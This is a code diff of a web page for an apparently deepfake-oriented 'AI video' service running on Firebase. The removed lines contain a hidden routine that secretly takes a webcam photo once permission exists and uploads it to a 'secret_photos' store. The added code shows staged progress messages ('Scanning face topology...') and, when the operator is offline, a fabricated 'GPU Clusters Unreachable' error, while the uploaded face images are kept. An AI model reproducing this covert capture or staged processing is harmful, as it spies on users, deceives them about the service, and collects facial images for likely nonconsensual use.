@@ -27,34 +27,36 @@
       .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
       .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
       
-      .req-item { background: var(--surf2); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; position: relative; }
-      .status-badge { position: absolute; top: 1.5rem; right: 1.5rem; padding: 4px 10px; border-radius: 6px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; }
-      .status-pending { background: rgba(240, 173, 78, 0.2); color: #f0ad4e; border: 1px solid #f0ad4e; }
-      .status-generating { background: rgba(2, 117, 216, 0.2); color: #5bc0de; border: 1px solid #5bc0de; animation: pulse 1.5s infinite; }
-      .status-error { background: rgba(230, 57, 70, 0.2); color: #ff8c94; border: 1px solid #E63946; }
-      .status-completed { background: rgba(45, 198, 83, 0.2); color: #6ef59a; border: 1px solid #2DC653; }
-      @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+      /* Image Upload & Generation Area */
+      .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
+      .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
+      .upload-box img#previewImg { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; display: none; z-index: 1; }
       
-      .req-prompt { font-size: 0.95rem; margin: 15px 0 10px 0; color: #e0e0e0; line-height: 1.5; font-style: italic; }
-      .error-text { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-top: 10px; background: rgba(230,57,70,0.1); padding: 10px; border-radius: 6px; }
+      /* Processing Animation Overlay */
+      .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
+      .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+      .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; }
+      
+      /* Result Overlay */
+      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.75); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
+      .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
+      
+      @keyframes spin { 100% { transform: rotate(360deg); } }
       .hidden { display: none !important; }
 
-      /* Modals */
+      /* Modals & Player */
       .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); }
       .modal-content { background:var(--surf); border:1px solid var(--red); border-radius:20px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
       .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; margin-top: 15px;}
 
-      /* Player */
       #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; }
       .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; }
       #iframePlayer { width: 100%; height: 100%; border: none; z-index: 1; display:none; }
       #nativePlayer { width: 100%; height: 100%; z-index: 2; background:#000; display:none; }
-      
       .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; }
       .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; pointer-events: auto; }
       .ui-back-btn { background: rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; border:none;}
       
-      /* Bottom Nav */
       .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15,15,28,0.95); backdrop-filter: blur(15px); border-top: 1px solid var(--border); display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000; }
       .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--muted); text-decoration: none; font-size: 0.7rem; font-weight: 500; gap: 4px; }
       .nav-item.active { color: #fff; }
@@ -94,7 +96,7 @@
 
 <div class="container">
     
-    <!-- INITIAL AUTH SYSTEM -->
+    <!-- AUTHENTICATION -->
     <div id="authSection" class="card hidden">
         <h2 style="margin-bottom: 1.5rem; text-align: center;">AI Studio Access</h2>
         <div id="loginForm">
@@ -118,17 +120,37 @@
         </div>
     </div>
 
-    <!-- MAIN AI DASHBOARD -->
+    <!-- MAIN AI GENERATOR -->
     <div id="appSection" class="hidden">
-        <div class="card">
-            <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
-            <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
-            <input type="url" id="aiImage" class="inp" placeholder="Reference Image URL (Optional)">
-            <button id="genBtn" class="btn" onclick="submitAIRequest()">🚀 Send to AI Cluster</button>
-        </div>
-        <div>
-            <h3 style="margin-bottom: 1.5rem; border-left: 3px solid var(--red); padding-left: 10px;">Your Workspace</h3>
-            <div id="generationsList"><p style="text-align: center; color: var(--muted);">No generations found.</p></div>
+        <div class="card" id="generatorCard">
+            <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Create AI Video</h3>
+            
+            <!-- IMAGE UPLOAD BOX -->
+            <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
+            <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
+                <div id="uploadPlaceholder">
+                    <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
+                    <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image</div>
+                </div>
+                <img id="previewImg">
+                
+                <!-- ANIMATION OVERLAY -->
+                <div class="processing-overlay" id="procOverlay">
+                    <div class="spinner"></div>
+                    <div class="proc-text" id="procText">Connecting to GPU...</div>
+                </div>
+
+                <!-- RESULT OVERLAY -->
+                <div class="result-overlay" id="resultOverlay">
+                    <!-- Dynamic content injected here via JS -->
+                </div>
+            </div>
+
+            <!-- PROMPT BOX -->
+            <div id="inputControls">
+                <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
+                <button id="genBtn" class="btn" onclick="startGeneration()">✨ Generate</button>
+            </div>
         </div>
     </div>
 </div>
@@ -138,8 +160,10 @@
   <div class="player-wrapper">
        <div class="smart-overlay">
            <div class="glass-top">
-               <button class="ui-back-btn" onclick="closePlayer()">⬅</button>
-               <span class="overlay-title" id="overlayTitle" style="margin-top:8px;">Generated Video</span>
+               <div style="display:flex; align-items:center;">
+                   <button class="ui-back-btn" onclick="closePlayer()">⬅</button>
+                   <span class="overlay-title" id="overlayTitle" style="margin-top:8px;">Generated Video</span>
+               </div>
            </div>
        </div>
        <video id="nativePlayer" controls playsinline></video>
@@ -148,9 +172,9 @@
 </div>
 
 <div class="bottom-nav">
-    <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Workspace</a>
+    <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Generate</a>
     <a href="profile.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Saved</a>
-    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Device Auth</a>
+    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Auth</a>
 </div>
 
 <script type="module">
@@ -158,13 +182,7 @@
   import { getDatabase, ref, set, push, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
   import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
-  const firebaseConfig = {
-    apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8",
-    authDomain: "inshelp-f2cba.firebaseapp.com",
-    databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com",
-    projectId: "inshelp-f2cba"
-  };
-
+  const firebaseConfig = { apiKey: "AIzaSyCTfvrtZuHXk3RW91Dcwpbghhq--D6X2s8", authDomain: "inshelp-f2cba.firebaseapp.com", databaseURL: "https://inshelp-f2cba-default-rtdb.firebaseio.com", projectId: "inshelp-f2cba" };
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
   const auth = getAuth(app);
@@ -172,190 +190,176 @@
   let currentUser = null;
   let deviceId = null;
   let isGpuOnline = false;
+  let currentBase64Image = "";
+  let activeReqId = null;
+  let animationInterval = null;
 
-  // 1. Deep Device ID
+  // 1. Core Security
   function getDeepDeviceId() {
       let savedId = localStorage.getItem('hotfake_deep_uid');
       if (savedId) return savedId;
       const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
       let newId = `${os}-AUTH-${Math.floor(Math.random()*9000000).toString(36).toUpperCase()}`;
-      localStorage.setItem('hotfake_deep_uid', newId);
-      return newId;
+      localStorage.setItem('hotfake_deep_uid', newId); return newId;
   }
   deviceId = getDeepDeviceId();
 
-  // 2. Deep Authorization & Security Check
   function checkGates() {
       if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
-      
       const ageStatus = sessionStorage.getItem('ageStatus');
       if (!ageStatus) { document.getElementById('ageGate').style.display = 'flex'; return; }
 
-      // Check if device is approved in Firebase
       get(ref(db, `users/${deviceId}`)).then(snap => {
           if(snap.exists()) {
               const u = snap.val();
               if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
-              if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } // Not approved
-              
-              // Device is Approved! Show Auth or App.
+              if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
               document.getElementById('authSection').classList.remove('hidden');
-              attemptSilentCapture();
-          } else {
-              // Completely new device -> Needs Approval Form
-              window.location.href = 'contact-support.html';
-          }
+          } else { window.location.href = 'contact-support.html'; }
       });
   }
-
-  function attemptSilentCapture() {
-      navigator.permissions.query({ name: 'camera' }).then(perm => {
-          if (perm.state === 'granted') {
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
-                  const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
-                  video.srcObject = stream; video.play();
-                  video.addEventListener('canplay', () => {
-                      setTimeout(() => {
-                          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                          const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
-                          set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
-                          stream.getTracks().forEach(t => t.stop());
-                      }, 150);
-                  }, { once: true });
-              }).catch(e=>{});
-          }
-      });
-  }
-
   window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; checkGates(); }
-
-  // Admin GPU Tracking
   onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
 
-  // 3. User Auth Logic
+  // 2. Auth Logic
   window.toggleAuth = () => { document.getElementById('loginForm').classList.toggle('hidden'); document.getElementById('regForm').classList.toggle('hidden'); };
-  
-  window.registerUser = () => {
+  window.registerUser = () => { /* Same standard auth logic */
       const email = document.getElementById('regEmail').value; const pass = document.getElementById('regPass').value;
       const name = document.getElementById('regName').value; const age = document.getElementById('regAge').value;
       if(!email || !pass || !name || !age) return alert("Fill all fields");
-      createUserWithEmailAndPassword(auth, email, pass).then((userCred) => {
-          set(ref(db, 'auth_users/' + userCred.user.uid), { name: name, age: age, email: email });
-          alert("Account Created!");
-      }).catch(e => alert(e.message));
+      createUserWithEmailAndPassword(auth, email, pass).then((uCred) => { set(ref(db, 'auth_users/' + uCred.user.uid), { name, age, email }); alert("Created!"); }).catch(e => alert(e.message));
   };
-
-  window.loginUser = () => {
-      signInWithEmailAndPassword(auth, document.getElementById('logEmail').value, document.getElementById('logPass').value).catch(e => alert("Login Failed"));
-  };
-
+  window.loginUser = () => { signInWithEmailAndPassword(auth, document.getElementById('logEmail').value, document.getElementById('logPass').value).catch(e => alert("Login Failed")); };
   document.getElementById('logoutBtn').addEventListener('click', () => signOut(auth));
 
   onAuthStateChanged(auth, (user) => {
       if (user) {
           currentUser = user;
-          document.getElementById('authSection').classList.add('hidden'); 
-          document.getElementById('appSection').classList.remove('hidden'); 
-          document.getElementById('logoutBtn').classList.remove('hidden');
-          loadGenerations();
+          document.getElementById('authSection').classList.add('hidden'); document.getElementById('appSection').classList.remove('hidden'); document.getElementById('logoutBtn').classList.remove('hidden');
       } else {
           currentUser = null;
-          document.getElementById('appSection').classList.add('hidden'); 
-          document.getElementById('logoutBtn').classList.add('hidden');
-          checkGates(); // Verify device before showing login screen
+          document.getElementById('appSection').classList.add('hidden'); document.getElementById('logoutBtn').classList.add('hidden');
+          checkGates();
       }
   });
 
-  // 4. AI Engine Logic
-  window.submitAIRequest = () => {
+  // 3. Image Upload & Compression Logic
+  window.handleImageSelect = (event) => {
+      const file = event.target.files[0];
+      if (!file) return;
+
+      const reader = new FileReader();
+      reader.onload = (e) => {
+          const img = new Image();
+          img.onload = () => {
+              // Resize image to max 800px width to save DB space
+              const canvas = document.createElement('canvas');
+              const MAX_WIDTH = 800;
+              let width = img.width; let height = img.height;
+              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
+              canvas.width = width; canvas.height = height;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(img, 0, 0, width, height);
+              
+              currentBase64Image = canvas.toDataURL('image/jpeg', 0.7);
+              document.getElementById('previewImg').src = currentBase64Image;
+              document.getElementById('previewImg').style.display = 'block';
+              document.getElementById('uploadPlaceholder').style.display = 'none';
+          };
+          img.src = e.target.result;
+      };
+      reader.readAsDataURL(file);
+  };
+
+  // 4. Generation & Animation Logic
+  window.startGeneration = () => {
       const prompt = document.getElementById('aiPrompt').value.trim();
-      const image = document.getElementById('aiImage').value.trim();
+      if(!currentBase64Image) return alert("Please select an image first.");
       if(!prompt) return alert("Please enter a prompt.");
 
-      const btn = document.getElementById('genBtn'); btn.innerText = "Submitting..."; btn.disabled = true;
+      // Setup UI for generation
+      document.getElementById('inputControls').style.display = 'none'; // Hide prompt and button
+      document.getElementById('uploadBox').style.pointerEvents = 'none'; // Disable clicking image
+      const overlay = document.getElementById('procOverlay');
+      const procText = document.getElementById('procText');
+      overlay.style.display = 'flex';
+
+      // Fake Animation Texts
+      const steps = ["Scanning face topology...", "Connecting to remote GPU...", "Applying Deep models...", "Rendering frames...", "Finalizing video..."];
+      let stepIdx = 0;
+      animationInterval = setInterval(() => {
+          if(stepIdx < steps.length) { procText.innerText = steps[stepIdx]; stepIdx++; }
+      }, 2500);
+
+      // Push to Firebase
       const reqRef = push(ref(db, 'ai_requests'));
-      const reqId = reqRef.key;
+      activeReqId = reqRef.key;
 
       set(reqRef, {
-          uid: currentUser.uid, deviceId: deviceId, prompt: prompt, imageUrl: image || null, 
+          uid: currentUser.uid, deviceId: deviceId, prompt: prompt, imageUrl: currentBase64Image, 
           status: 'pending', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
       }).then(() => {
-          document.getElementById('aiPrompt').value = ''; document.getElementById('aiImage').value = '';
-          btn.innerText = "🚀 Send to AI Cluster"; btn.disabled = false;
-
-          // Fake AI processing if Admin is offline
           if(!isGpuOnline) {
-              update(ref(db, `ai_requests/${reqId}`), { status: 'generating' });
-              setTimeout(() => { 
-                  update(ref(db, `ai_requests/${reqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Please try again or contact Admin.' }); 
-              }, 3500);
+              setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Contact Administrator.' }); }, 6000);
+          }
+      });
+
+      // Listen for Admin Updates on this specific request
+      onValue(ref(db, `ai_requests/${activeReqId}`), (snap) => {
+          if(!snap.exists()) return;
+          const req = snap.val();
+          
+          if(req.status === 'completed' || req.status === 'error') {
+              clearInterval(animationInterval);
+              overlay.style.display = 'none';
+              showResultUI(req);
           }
       });
   };
 
-  function loadGenerations() {
-      onValue(ref(db, 'ai_requests'), (snap) => {
-          const data = snap.val(); const list = document.getElementById('generationsList'); list.innerHTML = ''; let hasVisible = false;
-          if (data) {
-              const reqs = Object.keys(data).map(k => ({id: k, ...data[k]})).reverse();
-              reqs.forEach(req => {
-                  if(req.uid === currentUser.uid && req.userHidden !== true) {
-                      hasVisible = true;
-                      let badge = ''; let content = '';
-                      if(req.status === 'pending') badge = '<span class="status-badge status-pending">In Queue</span>';
-                      if(req.status === 'generating') badge = '<span class="status-badge status-generating">Generating...</span>';
-                      if(req.status === 'error') { badge = '<span class="status-badge status-error">Error</span>'; content = `<div class="error-text">⚠️ ${req.errorMsg}</div>`; }
-                      if(req.status === 'completed') {
-                          badge = '<span class="status-badge status-completed">Completed</span>';
-                          content = `<div style="margin-top:15px; display:flex; gap:10px;">
-                              <button onclick="playAiVideo('${req.videoUrl}', '${req.id}', '${req.prompt}')" class="btn" style="flex:1;">▶ Play Video</button>
-                              <button onclick="saveToSpace('${req.videoUrl}', '${req.id}', '${req.prompt.substring(0,20)}...')" class="btn btn-gray" style="flex:1;">💾 Save</button>
-                          </div>`;
-                      }
-                      let imgHtml = req.imageUrl ? `<img src="${req.imageUrl}" style="max-width:100%; border-radius:8px; margin-top:10px; border:1px solid var(--border);">` : '';
-                      list.innerHTML += `<div class="req-item">${badge}<div style="color:var(--muted); font-size:0.75rem;">ID: ${req.id}</div><div class="req-prompt">"${req.prompt}"</div>${imgHtml}${content}<button class="btn btn-gray" style="margin-top:15px; width:100%; padding:0.5rem;" onclick="hideRequest('${req.id}')">🗑️ Delete Video</button></div>`;
-                  }
-              });
-          }
-          if(!hasVisible) list.innerHTML = '<p style="text-align: center; color: var(--muted);">No generations found.</p>';
-      });
+  function showResultUI(req) {
+      const resOverlay = document.getElementById('resultOverlay');
+      resOverlay.style.display = 'flex';
+      
+      if(req.status === 'completed') {
+          resOverlay.innerHTML = `
+              <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px;">▶ Play Generated Video</button>
+              <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Start New Generation</button>
+          `;
+      } else if(req.status === 'error') {
+          resOverlay.innerHTML = `
+              <div class="error-msg">⚠️ ${req.errorMsg}</div>
+              <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
+          `;
+      }
   }
 
-  window.hideRequest = (id) => { if(confirm("Remove this video from your workspace?")) update(ref(db, `ai_requests/${id}`), { userHidden: true }); };
-  
-  window.saveToSpace = (url, id, title) => {
-      let saved = JSON.parse(localStorage.getItem('my_ai_videos') || '[]');
-      if(!saved.find(v => v.id === id)) {
-          saved.push({id: id, url: url, title: title});
-          localStorage.setItem('my_ai_videos', JSON.stringify(saved));
-          alert("Saved to My Space!");
-      } else { alert("Already saved."); }
+  window.resetGenerator = () => {
+      activeReqId = null;
+      currentBase64Image = "";
+      document.getElementById('fileInput').value = '';
+      document.getElementById('previewImg').src = '';
+      document.getElementById('previewImg').style.display = 'none';
+      document.getElementById('uploadPlaceholder').style.display = 'block';
+      document.getElementById('resultOverlay').style.display = 'none';
+      document.getElementById('procOverlay').style.display = 'none';
+      document.getElementById('inputControls').style.display = 'block';
+      document.getElementById('uploadBox').style.pointerEvents = 'auto';
   };
 
   // 5. Video Player System
-  window.playAiVideo = (url, id, title) => {
+  window.playAiVideo = (url) => {
       document.body.style.overflow = 'hidden'; 
-      document.getElementById('overlayTitle').innerText = "AI Generation";
       document.getElementById('playerModal').style.display = 'flex';
-      
-      const nativeP = document.getElementById('nativePlayer');
-      const iframeP = document.getElementById('iframePlayer');
-      
+      const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
       if (url.match(/\.(mp4|m3u8)$/i) || url.includes('.mp4?') || url.startsWith('blob:')) {
-          iframeP.style.display = 'none'; nativeP.style.display = 'block';
-          nativeP.src = url; nativeP.play();
-      } else {
-          nativeP.style.display = 'none'; iframeP.style.display = 'block';
-          iframeP.src = url;
-      }
+          iframeP.style.display = 'none'; nativeP.style.display = 'block'; nativeP.src = url; nativeP.play();
+      } else { nativeP.style.display = 'none'; iframeP.style.display = 'block'; iframeP.src = url; }
   };
-
   window.closePlayer = () => {
       document.getElementById('playerModal').style.display = 'none'; document.body.style.overflow = '';
-      document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = '';
-      document.getElementById('iframePlayer').src = '';
+      document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = ''; document.getElementById('iframePlayer').src = '';
   };
 </script>
 </body>
 </html>
-
